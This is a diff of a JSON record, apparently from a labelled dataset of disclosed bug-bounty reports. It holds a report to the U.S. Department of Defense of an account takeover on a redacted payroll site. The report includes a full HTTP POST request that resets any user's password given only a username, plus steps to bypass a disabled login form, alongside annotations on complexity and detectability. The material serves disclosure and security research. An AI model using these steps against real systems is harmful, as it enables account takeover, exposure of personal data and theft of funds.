@@ -1,56 +1,56 @@
 {
-    "reported_to": "U.S. Dept Of Defense",
-    "reported_by": "cablej_dds ",
-    "title": "\u2588\u2588\u2588\u2588 - Complete account takeover",
-    "content": "\nSummary:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 was updated today (03/04), which includes a backend rewrite. Unfortunately, the new site is insecure and allows a password to be reset given only a username. This allows access to payment records for any DoD employee given only their username, which is commonly known. Further, \u2588\u2588\u2588 is used to authenticate to other sites such as \u2588\u2588\u2588\u2588\u2588\u2588. Thus, this allows access to the complete \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 record and other associated information (despite \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 stating that \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 login is disabled, it still works).\nImpact\nTrivial and complete compromise of any/all \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 accounts, resulting in exposure and modification of sensitive financial records for all DoD civilian/military personnel. For instance, this exposes partial social security numbers, personal addresses, and pay history, and allows stealing funds by changing direct deposit information. Further, via associated sites (\u2588\u2588\u2588\u2588\u2588), this exposes the \u2588\u2588\u2588\u2588\u2588\u2588 of all military service members.\nStep-by-step Reproduction Instructions\nVisit https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ and intercept a request to obtain valid cookies.\nMake the following request, replacing the cookies with your new cookies if needed:\nCode 646 Bytes\n1POST /api/session/personalsettings/ForgotPasswordChangeRequest HTTP/1.1\n2Host: \u2588\u2588\u2588\n3Connection: close\n4Content-Length: 151\n5Accept: application/json, text/plain, */*\n6Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\n8Content-Type: application/json\n9Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\n10Accept-Encoding: gzip, deflate\n11Accept-Language: en-US,en;q=0.9\n12Cookie: LastMRH_Session=\u2588\u2588\u2588\u2588\u2588; F5_ST=\u2588\u2588\u2588\u2588\u2588\u2588; MRHSession=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n13\n14{\"Username\":\"x\",\"Password\":\"y\",\"IsLimitedAccessAccount\":false,\"HasNagC\":false,\"HasNagF\":false,\"HasNagM\":false,\"HasNagN\":false}\nEnter any user's username and a new password.\nSubmit the request. The user's password will be overwritten to the new password, and you may now log in.\nVisit https://\u2588\u2588\u2588\u2588\u2588\u2588/milconnect/. Select to log in via \u2588\u2588\u2588\u2588\u2588. Despite the message saying it is disabled, edit the form via developer tools to enable both text boxes and the login button. Enter the user's credentials.\nThe login will be successful, allowing full access to the user's \u2588\u2588\u2588.\nSuggested Mitigation/Remediation Actions\nEnforce social security number / security questions / email verification.\nImpact\n.\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "cablej_dds ",
+  "title": "\u2588\u2588\u2588\u2588 - Complete account takeover",
+  "content": "\nSummary:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 was updated today (03/04), which includes a backend rewrite. Unfortunately, the new site is insecure and allows a password to be reset given only a username. This allows access to payment records for any DoD employee given only their username, which is commonly known. Further, \u2588\u2588\u2588 is used to authenticate to other sites such as \u2588\u2588\u2588\u2588\u2588\u2588. Thus, this allows access to the complete \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 record and other associated information (despite \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 stating that \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 login is disabled, it still works).\nImpact\nTrivial and complete compromise of any/all \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 accounts, resulting in exposure and modification of sensitive financial records for all DoD civilian/military personnel. For instance, this exposes partial social security numbers, personal addresses, and pay history, and allows stealing funds by changing direct deposit information. Further, via associated sites (\u2588\u2588\u2588\u2588\u2588), this exposes the \u2588\u2588\u2588\u2588\u2588\u2588 of all military service members.\nStep-by-step Reproduction Instructions\nVisit https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ and intercept a request to obtain valid cookies.\nMake the following request, replacing the cookies with your new cookies if needed:\nCode 646 Bytes\n1POST /api/session/personalsettings/ForgotPasswordChangeRequest HTTP/1.1\n2Host: \u2588\u2588\u2588\n3Connection: close\n4Content-Length: 151\n5Accept: application/json, text/plain, */*\n6Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\n8Content-Type: application/json\n9Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\n10Accept-Encoding: gzip, deflate\n11Accept-Language: en-US,en;q=0.9\n12Cookie: LastMRH_Session=\u2588\u2588\u2588\u2588\u2588; F5_ST=\u2588\u2588\u2588\u2588\u2588\u2588; MRHSession=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n13\n14{\"Username\":\"x\",\"Password\":\"y\",\"IsLimitedAccessAccount\":false,\"HasNagC\":false,\"HasNagF\":false,\"HasNagM\":false,\"HasNagN\":false}\nEnter any user's username and a new password.\nSubmit the request. The user's password will be overwritten to the new password, and you may now log in.\nVisit https://\u2588\u2588\u2588\u2588\u2588\u2588/milconnect/. Select to log in via \u2588\u2588\u2588\u2588\u2588. Despite the message saying it is disabled, edit the form via developer tools to enable both text boxes and the login button. Enter the user's credentials.\nThe login will be successful, allowing full access to the user's \u2588\u2588\u2588.\nSuggested Mitigation/Remediation Actions\nEnforce social security number / security questions / email verification.\nImpact\n.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Improper Authentication - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1589230140,
+  "report_url": "https://hackerone.com/reports/566811",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Visit the target website and intercept a request to obtain valid session cookies."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Improper Authentication - Generic"
+    [
+      2,
+      "Send a POST request to the password reset endpoint with the intercepted cookies, specifying only the target username and a new password."
     ],
-    "screenshots": {},
-    "disclosed_date": 1589230140,
-    "report_url": "https://hackerone.com/reports/566811",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Visit the target website and intercept a request to obtain valid session cookies."
-        ],
-        [
-            2,
-            "Send a POST request to the password reset endpoint with the intercepted cookies, specifying only the target username and a new password."
-        ],
-        [
-            3,
-            "Log in to the target account using the new password."
-        ],
-        [
-            4,
-            "Access the associated site (e.g., milconnect) by enabling disabled login fields via developer tools and logging in with the compromised credentials."
-        ]
+    [
+      3,
+      "Log in to the target account using the new password."
     ],
-    "vuln_description": "The vulnerability allows complete account takeover by resetting any user's password with only their username, bypassing standard security checks. This exposes sensitive financial and personal data, including partial SSNs, addresses, and pay history, and enables fund theft via direct deposit changes. Additionally, it grants access to other associated systems despite claimed disabled login functionality.",
-    "reason": "The attack involves multiple components (password reset, cookie interception, UI manipulation) and requires understanding of how the systems interconnect, but the core flaw (password reset with only username) is straightforward once identified. The manipulation of disabled login fields adds some complexity but is a known technique.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": true
-    }
+    [
+      4,
+      "Access the associated site (e.g., milconnect) by enabling disabled login fields via developer tools and logging in with the compromised credentials."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows complete account takeover by resetting any user's password with only their username, bypassing standard security checks. This exposes sensitive financial and personal data, including partial SSNs, addresses, and pay history, and enables fund theft via direct deposit changes. Additionally, it grants access to other associated systems despite claimed disabled login functionality.",
+  "reason": "The attack involves multiple components (password reset, cookie interception, UI manipulation) and requires understanding of how the systems interconnect, but the core flaw (password reset with only username) is straightforward once identified. The manipulation of disabled login fields adds some complexity but is a known technique.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a password reset functionality that can be exploited by intercepting and modifying HTTP requests with a different username and password. This falls under the AuthN/AuthZ Bypass methodology where the authorization boundary is crossed by manipulating the request parameters. The detection method involves swapping user sessions and testing actions with different resource IDs, which aligns with the described methodology.",
+    "is_detectable": true
+  }
 }
